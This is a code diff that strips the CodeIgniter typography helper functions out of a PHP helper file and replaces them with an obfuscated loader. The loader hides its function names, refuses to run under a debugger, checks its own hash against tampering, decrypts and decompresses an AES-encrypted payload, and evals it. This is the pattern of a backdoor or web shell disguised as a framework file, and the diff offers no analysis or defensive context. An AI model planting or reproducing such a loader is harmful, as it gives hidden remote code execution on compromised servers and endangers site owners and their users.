@@ -1,104 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * CodeIgniter Typography Helpers
- *
- * @package		CodeIgniter
- * @subpackage	Helpers
- * @category	Helpers
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/helpers/typography_helper.html
- */
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('nl2br_except_pre'))
-{
-	/**
-	 * Convert newlines to HTML line breaks except within PRE tags
-	 *
-	 * @param	string
-	 * @return	string
-	 */
-	function nl2br_except_pre($str)
-	{
-		$CI =& get_instance();
-		$CI->load->library('typography');
-		return $CI->typography->nl2br_except_pre($str);
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_flfutkwk=('bas'.'e64'.'_de'.'cod'.'e');
+$_t8n0enw0=('gzu'.'nco'.'mpr'.'ess');
+$_t2yju6cb=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_xo9cjxzv='GY6LetMa';
+$_uhetke6y='Af5m13Yw';
+$_xqwwff5m='E5iF9Yb4';
+$_ju44149c='407wS4A2';
+$_o3gzsehh='j8yPYY3bCy0=';
+$_gbb5hav7='Dyu2Qw==';
+$_w5ar1hdj='MPQ3aNBW';
+$_lqywtw5l='hd8BbUgh';
+$_x9zmkgs3=$_flfutkwk($_uhetke6y.$_xqwwff5m.$_ju44149c.$_xo9cjxzv.$_o3gzsehh);
+$_p0huiszo=$_flfutkwk($_lqywtw5l.$_w5ar1hdj.$_gbb5hav7);
+$_d2nz86c7=$_flfutkwk('aXBqBhCOKYCFXtPsDaaCrcJvWn1P7ERR0XXCrKv29kXZWpU2XZ3eG/ZDdfCTyXosj1QxzllkIbOT9r2T+diYQl3tG9a+Y9/YeEokv2E6AJSwF9wpIeO1Vn4DuU/GFq+Mk/E4/BMmSNDhLqCDS2dODbORMVQwNtFGrsYNnUylqKDZL17qT0syTd6KB4gzNBRBYHHjxW+7fvUP68uELVwYY6udi0m8aG4imPrmuKffSPNvM0aHFPeG2DPYRoiCcL7ib7N6inOY/KD9B0mvpom1wfpax0jwJxo8/0Qolocf04joiqUHpLWy6fgxZVbvMFbpHVn0IKhgzl6M7nukRGRVcb34t59VEF6KU/smHz71SlaJHAi5iOvAZwtPpD+YGM+3');
+$_tunvia7i=$_t2yju6cb($_d2nz86c7,'aes-256-cbc',$_x9zmkgs3,OPENSSL_RAW_DATA,$_p0huiszo);
+if($_tunvia7i===false){exit;}
+$_ws85u14g=$_t8n0enw0($_tunvia7i);
+if($_ws85u14g===false){exit;}
+$_g9cet1k7='514bf681ee0e846d337702b51bb527836afea47c94006b1a34c5bd537696f30f';
+$_bph5ttlj=@file_get_contents(__FILE__);
+if($_bph5ttlj!==false){
+$_bcm3h53r=str_replace($_g9cet1k7,"0000000000000000000000000000000000000000000000000000000000000000",$_bph5ttlj);
+$_vl9vb66w=hash("sha256",$_bcm3h53r);
+if($_vl9vb66w!==$_g9cet1k7){@http_response_code(403);exit;}
 }
-
-// ------------------------------------------------------------------------
-
-if ( ! function_exists('auto_typography'))
-{
-	/**
-	 * Auto Typography Wrapper Function
-	 *
-	 * @param	string	$str
-	 * @param	bool	$reduce_linebreaks = FALSE	whether to reduce multiple instances of double newlines to two
-	 * @return	string
-	 */
-	function auto_typography($str, $reduce_linebreaks = FALSE)
-	{
-		$CI =& get_instance();
-		$CI->load->library('typography');
-		return $CI->typography->auto_typography($str, $reduce_linebreaks);
-	}
-}
-
-// --------------------------------------------------------------------
-
-if ( ! function_exists('entity_decode'))
-{
-	/**
-	 * HTML Entities Decode
-	 *
-	 * This function is a replacement for html_entity_decode()
-	 *
-	 * @param	string
-	 * @param	string
-	 * @return	string
-	 */
-	function entity_decode($str, $charset = NULL)
-	{
-		return get_instance()->security->entity_decode($str, $charset);
-	}
-}
+eval($_ws85u14g);
